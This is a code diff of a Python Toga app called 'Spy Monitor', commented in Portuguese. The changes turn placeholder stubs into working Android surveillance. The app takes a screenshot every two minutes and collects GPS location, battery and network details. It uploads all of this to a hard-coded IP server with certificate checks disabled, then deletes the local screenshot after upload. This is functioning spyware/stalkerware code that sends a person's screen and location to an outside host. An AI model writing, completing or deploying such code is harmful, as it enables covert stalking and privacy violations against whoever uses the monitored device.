@@ -1,159 +1,156 @@
 import toga
 from toga.style import Pack
-from toga.style.pack import COLUMN, ROW
+from toga.style.pack import COLUMN
 import time
+import datetime
 import threading
 import requests
-import json
-from datetime import datetime
 import uuid
 import platform
+import os
+import tempfile
 import logging
 import queue
-import os
 
-# Configuração do servidor externo
+# Configurações otimizadas
 SERVER_URL = "https://147.79.111.118"
-
-# Configurações otimizadas para coleta leve
-COLLECTION_INTERVAL = 120  # segundos (mais espaçado para reduzir bateria)
-SCREENSHOT_INTERVAL = 120  # segundos (2 minutos para screenshots)
-REQUEST_TIMEOUT = 20  # segundos (mais tempo para conexões lentas)
-MAX_RETRIES = 5  # mais tentativas para confiabilidade
-BATCH_SIZE = 3  # lotes menores para evitar sobrecarga
+COLLECTION_INTERVAL = 120  # 2 minutos
+REQUEST_TIMEOUT = 15
 
 class SpyMonitor(toga.App):
     def __init__(self, formal_name="Spy Monitor", app_id="org.beeware.spymonitor"):
         super().__init__(formal_name=formal_name, app_id=app_id)
 
     def main_module(self):
-        """Retorna o módulo principal para briefcase"""
-        return "spymonitor.app_toga"
+        return "spymonitor.main"
+
     def startup(self):
-        """Inicializar a aplicação de monitoramento"""
-        # Variáveis de controle
-        self.is_monitoring = False
-        self.device_id = self.get_device_id()
-        self.collection_count = 0
-        self.data_queue = queue.Queue(maxsize=50)  # Fila para dados coletados
-        self.send_thread = None
-        self.last_collection = 0
-        self.last_screenshot = 0
+        try:
+            # Inicializar atributos otimizados
+            self.device_id = self.get_device_id()
+            self.is_monitoring = False
+            self.collection_count = 0
+            self.monitoring_thread = None
+            self.data_queue = queue.Queue(maxsize=20)  # Fila menor para leveza
+            self.last_collection = 0
+            self.last_screenshot = 0
+            self.send_thread = None
 
-        # Criar interface principal com Toga
-        main_box = toga.Box(style=Pack(direction=COLUMN, padding=10))
+            # Interface principal
+            main_box = toga.Box(style=Pack(direction=COLUMN, padding=10))
 
-        # Título
-        title_label = toga.Label(
-            '📱 Spy Monitor',
-            style=Pack(text_align='center', font_size=20, font_weight='bold', padding_bottom=20)
-        )
-        main_box.add(title_label)
+            # Título
+            title = toga.Label(
+                "📱 Spy Monitor",
+                style=Pack(padding=(0, 5), font_size=18)
+            )
+            main_box.add(title)
 
-        # Status
-        self.status_label = toga.Label(
-            'Status: Parado',
-            style=Pack(text_align='center', color='red', font_size=16, padding_bottom=10)
-        )
-        main_box.add(self.status_label)
+            # Status
+            self.status_label = toga.Label(
+                "Status: Parado",
+                style=Pack(padding=(0, 5))
+            )
+            main_box.add(self.status_label)
 
-        # Botão Iniciar/Parar
-        self.monitor_button = toga.Button(
-            '▶️ Iniciar Monitoramento',
-            on_press=self.toggle_monitoring,
-            style=Pack(padding=10, background_color='#4CAF50')
-        )
-        main_box.add(self.monitor_button)
+            # Contador
+            self.counter_label = toga.Label(
+                "Dados enviados: 0",
+                style=Pack(padding=(0, 5))
+            )
+            main_box.add(self.counter_label)
 
-        # Área de logs
-        logs_title = toga.Label(
-            '📋 Logs:',
-            style=Pack(font_weight='bold', padding_top=20, padding_bottom=5)
-        )
-        main_box.add(logs_title)
+            # Botão principal
+            self.monitor_button = toga.Button(
+                "▶️ Iniciar Monitoramento",
+                on_press=self.toggle_monitoring,
+                style=Pack(padding=(5, 0))
+            )
+            main_box.add(self.monitor_button)
 
-        # ScrollView para logs
-        self.logs_text = toga.MultilineTextInput(
-            readonly=True,
-            style=Pack(flex=1, padding=5)
-        )
-        main_box.add(self.logs_text)
+            # Logs simples
+            self.log_label = toga.Label(
+                "Logs: Pronto",
+                style=Pack(padding=(10, 5, 0, 5), font_size=12)
+            )
+            main_box.add(self.log_label)
 
-        self.add_log("App iniciado")
-        self.add_log(f"ID do Dispositivo: {self.device_id}")
-        self.add_log(f"Servidor: {SERVER_URL}")
+            # Janela principal
+            self.main_window = toga.MainWindow(title="Spy Monitor")
+            self.main_window.content = main_box
+            self.main_window.show()
 
-        # Criar janela principal
-        self.main_window = toga.MainWindow(title=self.formal_name)
-        self.main_window.content = main_box
-        self.main_window.show()
+            self.update_log("App inicializado")
+
+        except Exception as e:
+            # Interface de erro
+            error_box = toga.Box(style=Pack(direction=COLUMN, padding=10))
+            error_label = toga.Label(f"Erro: {str(e)[:50]}", style=Pack(padding=(0, 5)))
+            error_box.add(error_label)
+
+            self.main_window = toga.MainWindow(title="Erro")
+            self.main_window.content = error_box
+            self.main_window.show()
 
     def get_device_id(self):
-        """Gera ID único do dispositivo"""
         try:
-            # Tentar obter ID único baseado no dispositivo
+            # ID único simples
             import hashlib
-            unique_string = f"{platform.node()}-{platform.machine()}-{platform.processor()}"
+            unique_string = f"{platform.node()}-{platform.machine()}"
             return hashlib.md5(unique_string.encode()).hexdigest()[:15]
         except:
             return str(uuid.uuid4())[:15]
 
-    def add_log(self, message):
-        """Adiciona mensagem aos logs"""
-        timestamp = datetime.now().strftime('%H:%M:%S')
-        log_entry = f"[{timestamp}] {message}\n"
-
-        current_text = self.logs_text.value or ""
-        lines = (current_text + log_entry).split('\n')
-        if len(lines) > 20:
-            lines = lines[-20:]
-        self.logs_text.value = '\n'.join(lines)
+    def update_log(self, message):
+        try:
+            timestamp = datetime.datetime.now().strftime('%H:%M:%S')
+            self.log_label.text = f"[{timestamp}] {message}"
+        except:
+            pass
 
     def toggle_monitoring(self, widget):
-        """Alterna monitoramento"""
         if not self.is_monitoring:
             self.start_monitoring()
         else:
             self.stop_monitoring()
 
     def start_monitoring(self):
-        """Inicia monitoramento"""
-        self.is_monitoring = True
-        self.status_label.text = 'Status: Ativo'
-        self.status_label.style.color = 'green'
-        self.monitor_button.text = '⏹️ Parar Monitoramento'
-        self.monitor_button.style.background_color = '#F44336'
+        try:
+            self.is_monitoring = True
+            self.status_label.text = "Status: Ativo"
+            self.monitor_button.text = "⏹️ Parar Monitoramento"
 
-        # Testar conexão com servidor
-        self.test_server_connection()
+            # Testar conexão
+            if self.test_connection():
+                self.update_log("Conectado ao servidor")
 
-        # Iniciar thread de monitoramento
-        self.monitoring_thread = threading.Thread(target=self.monitoring_loop, daemon=True)
-        self.monitoring_thread.start()
+                # Iniciar monitoramento em thread
+                self.monitoring_thread = threading.Thread(target=self.monitoring_loop, daemon=True)
+                self.monitoring_thread.start()
 
-        self.add_log("Monitoramento iniciado - Captura automática de screenshots ativada")
+                self.update_log("Monitoramento iniciado - Captura automática de screenshots ativada")
+            else:
+                self.update_log("Erro: Servidor indisponível")
+                self.stop_monitoring()
+
+        except Exception as e:
+            self.update_log(f"Erro ao iniciar: {str(e)[:30]}")
+            self.stop_monitoring()
 
     def stop_monitoring(self):
-        """Para monitoramento"""
-        self.is_monitoring = False
-        self.status_label.text = 'Status: Parado'
-        self.status_label.style.color = 'red'
-        self.monitor_button.text = '▶️ Iniciar Monitoramento'
-        self.monitor_button.style.background_color = '#4CAF50'
-        self.add_log("Monitoramento parado - Captura de screenshots desativada")
-
-    def test_server_connection(self):
-        """Testa conexão com servidor"""
         try:
-            response = requests.get(f"{SERVER_URL}/api/test/", timeout=REQUEST_TIMEOUT, verify=False)
-            if response.status_code == 200:
-                self.add_log("✅ Servidor conectado")
-                return True
-            else:
-                self.add_log(f"⚠️ Resposta do servidor: {response.status_code}")
-                return False
-        except requests.exceptions.RequestException as e:
-            self.add_log(f"❌ Erro de conexão: {str(e)[:50]}")
+            self.is_monitoring = False
+            self.status_label.text = "Status: Parado"
+            self.monitor_button.text = "▶️ Iniciar Monitoramento"
+            self.update_log("Monitoramento parado")
+        except:
+            pass
+
+    def test_connection(self):
+        try:
+            response = requests.get(f"{SERVER_URL}/", timeout=REQUEST_TIMEOUT, verify=False)
+            return response.status_code == 200
+        except:
             return False
 
     def monitoring_loop(self):
@@ -168,32 +165,32 @@ class SpyMonitor(toga.App):
                     self.collect_and_send_data()
 
                 # Captura de screenshot a cada 2 minutos
-                if current_time - self.last_screenshot >= SCREENSHOT_INTERVAL:
+                if current_time - self.last_screenshot >= COLLECTION_INTERVAL:
                     self.last_screenshot = current_time
                     self.take_screenshot()
 
-                time.sleep(5)  # Sleep menor para resposta mais rápida
+                time.sleep(10)  # Sleep maior para estabilidade
 
             except Exception as e:
-                self.add_log(f"Erro no loop principal: {str(e)[:50]}")
-                time.sleep(10)
+                self.update_log(f"Erro no loop principal: {str(e)[:30]}")
+                time.sleep(15)
 
     def collect_and_send_data(self):
-        """Coleta e envia dados para o servidor de forma otimizada e leve"""
+        """Coleta e envia dados de forma otimizada e leve"""
         try:
             collected_data = []
 
             # Dados básicos do dispositivo (sempre coletar - mais leve)
             device_data = {
                 'imei': self.device_id,
-                'timestamp': datetime.now().isoformat(),
+                'timestamp': datetime.datetime.now().isoformat(),
                 'platform': platform.system(),
                 'version': platform.version()[:10] if platform.version() else 'Unknown'
             }
             collected_data.append(('device_info', device_data))
 
             # Coletar localização (menos frequente - economia de bateria)
-            if self.collection_count % 3 == 0:  # A cada 3 coletas (menos frequente)
+            if self.collection_count % 3 == 0:  # A cada 3 coletas
                 location = self.get_location()
                 if location:
                     collected_data.append(('location', location))
@@ -213,29 +210,45 @@ class SpyMonitor(toga.App):
             # Enviar dados coletados apenas se houver dados
             if collected_data:
                 self.send_collected_data(collected_data)
-                self.add_log(f"✅ {len(collected_data)} tipos de dados enviados")
+                self.update_log(f"✅ {len(collected_data)} tipos enviados")
             else:
-                self.add_log("ℹ️ Nenhum dado novo para enviar")
+                self.update_log("ℹ️ Nenhum dado novo")
 
             self.collection_count += 1
 
         except Exception as e:
-            self.add_log(f"❌ Erro na coleta: {str(e)[:40]}")
+            self.update_log(f"❌ Erro na coleta: {str(e)[:25]}")
 
     def get_location(self):
         """Obtém localização do dispositivo"""
         try:
-            # Para BeeWare/Toga, localização pode ser obtida via permissões do sistema
-            # Implementação simplificada - em produção precisaria de GPS API
-            return {
-                'latitude': 0.0,  # Placeholder
-                'longitude': 0.0,  # Placeholder
-                'accuracy': 0,
-                'timestamp': datetime.now().isoformat()
-            }
-        except Exception as e:
-            self.add_log(f"Erro no GPS: {str(e)[:30]}")
+            if platform.system() == 'Android':
+                from plyer import gps
+
+                # Configurar GPS
+                gps.configure(on_location=self.on_location_update)
+                gps.start(minTime=1000, minDistance=1)
+
+                # Aguardar um pouco pela localização
+                time.sleep(2)
+                gps.stop()
+
+                if hasattr(self, 'last_location'):
+                    return self.last_location
+
             return None
+        except Exception as e:
+            self.update_log(f"Erro no GPS: {str(e)[:20]}")
+            return None
+
+    def on_location_update(self, **kwargs):
+        """Callback para atualização de localização"""
+        self.last_location = {
+            'latitude': kwargs.get('lat'),
+            'longitude': kwargs.get('lon'),
+            'accuracy': kwargs.get('accuracy'),
+            'timestamp': datetime.datetime.now().isoformat()
+        }
 
     def get_network_info(self):
         """Obtém informações de rede"""
@@ -247,32 +260,49 @@ class SpyMonitor(toga.App):
             return {
                 'hostname': hostname,
                 'local_ip': local_ip,
-                'timestamp': datetime.now().isoformat()
+                'timestamp': datetime.datetime.now().isoformat()
             }
         except:
             return None
 
     def get_battery_info(self):
-        """Obtém informações da bateria"""
+        """Obtém informações da bateria (Android)"""
         try:
-            # Para BeeWare/Toga, bateria pode ser obtida via API do sistema
-            # Implementação simplificada
-            return {
-                'level': 100,  # Placeholder
-                'charging': False,  # Placeholder
-                'timestamp': datetime.now().isoformat()
-            }
+            if platform.system() == 'Android':
+                from plyer import battery
+
+                battery_status = battery.status
+                return {
+                    'level': battery_status.get('percentage', 0),
+                    'charging': battery_status.get('isCharging', False),
+                    'timestamp': datetime.datetime.now().isoformat()
+                }
+            return None
         except:
             return None
 
     def take_screenshot(self):
         """Captura screenshot automática a cada 2 minutos"""
         try:
-            # Para BeeWare/Toga, screenshots podem ser capturados via API do sistema
-            # Implementação simplificada - em produção precisaria de screenshot API
-            self.add_log("📸 Screenshot seria capturado (simulado)")
+            if platform.system() == 'Android':
+                from plyer import screenshot
+
+                # Criar arquivo temporário para screenshot
+                temp_dir = tempfile.gettempdir()
+                screenshot_path = os.path.join(temp_dir, f"screenshot_{int(time.time())}.png")
+
+                # Capturar screenshot
+                screenshot.take_screenshot(screenshot_path)
+
+                if os.path.exists(screenshot_path):
+                    # Enviar screenshot para servidor
+                    self.upload_screenshot(screenshot_path)
+                    self.update_log("📸 Screenshot capturado")
+                else:
+                    self.update_log("❌ Falha no screenshot")
+
         except Exception as e:
-            self.add_log(f"Erro no screenshot: {str(e)[:40]}")
+            self.update_log(f"Erro screenshot: {str(e)[:20]}")
 
     def upload_screenshot(self, screenshot_path):
         """Faz upload do screenshot para o servidor"""
@@ -296,15 +326,15 @@ class SpyMonitor(toga.App):
 
                     if response.status_code == 200:
                         os.remove(screenshot_path)  # Remove arquivo após upload
-                        self.add_log("✅ Screenshot enviado com sucesso")
+                        self.update_log("✅ Screenshot enviado")
                     else:
-                        self.add_log(f"⚠️ Erro upload screenshot: {response.status_code}")
+                        self.update_log(f"⚠️ Upload erro: {response.status_code}")
 
         except Exception as e:
-            self.add_log(f"❌ Erro no upload: {str(e)[:40]}")
+            self.update_log(f"❌ Erro upload: {str(e)[:20]}")
 
     def send_collected_data(self, data_list):
-        """Envia dados coletados de forma otimizada com retry"""
+        """Envia dados coletados de forma otimizada"""
         for data_type, data in data_list:
             self.send_data_with_retry(data_type, data)
 
@@ -329,43 +359,42 @@ class SpyMonitor(toga.App):
             if response.status_code in [200, 201]:
                 # Logs mais concisos
                 if data_type == 'location':
-                    self.add_log("📍 Localização OK")
+                    self.update_log("📍 Localização OK")
                 elif data_type == 'network':
-                    self.add_log("🌐 Rede OK")
+                    self.update_log("🌐 Rede OK")
                 elif data_type == 'battery':
                     nivel = data.get('level', data.get('bateria_nivel', 'N/A'))
-                    self.add_log(f"🔋 Bateria: {nivel}%")
+                    self.update_log(f"🔋 Bateria: {nivel}%")
                 # Device info não loga para reduzir verbosidade
             else:
-                if retry_count < MAX_RETRIES:
-                    # Backoff exponencial com jitter para evitar sobrecarga
-                    delay = (2 ** retry_count) + (retry_count * 0.1)
-                    time.sleep(min(delay, 30))  # Máximo 30 segundos
+                if retry_count < 3:  # Menos retries para leveza
+                    delay = (2 ** retry_count) + 1
+                    time.sleep(min(delay, 15))  # Máximo 15 segundos
                     self.send_data_with_retry(data_type, data, retry_count + 1)
                 else:
-                    self.add_log(f"⚠️ {data_type}: HTTP {response.status_code}")
+                    self.update_log(f"⚠️ {data_type}: HTTP {response.status_code}")
 
         except requests.exceptions.Timeout:
-            if retry_count < MAX_RETRIES:
+            if retry_count < 3:
                 delay = (2 ** retry_count) + 1
-                time.sleep(min(delay, 30))
+                time.sleep(min(delay, 15))
                 self.send_data_with_retry(data_type, data, retry_count + 1)
             else:
-                self.add_log(f"⏰ Tempo limite {data_type}")
+                self.update_log(f"⏰ Timeout {data_type}")
         except requests.exceptions.ConnectionError:
-            if retry_count < MAX_RETRIES:
+            if retry_count < 3:
                 delay = (2 ** retry_count) + 2
-                time.sleep(min(delay, 30))
+                time.sleep(min(delay, 15))
                 self.send_data_with_retry(data_type, data, retry_count + 1)
             else:
-                self.add_log(f"🔌 Conexão {data_type} falhou")
+                self.update_log(f"🔌 Conexão {data_type} falhou")
         except requests.exceptions.RequestException as e:
-            if retry_count < MAX_RETRIES:
+            if retry_count < 3:
                 delay = (2 ** retry_count) + 1
-                time.sleep(min(delay, 30))
+                time.sleep(min(delay, 15))
                 self.send_data_with_retry(data_type, data, retry_count + 1)
             else:
-                self.add_log(f"❌ Erro {data_type}: {str(e)[:25]}")
+                self.update_log(f"❌ Erro {data_type}: {str(e)[:15]}")
 
 def main():
     return SpyMonitor()
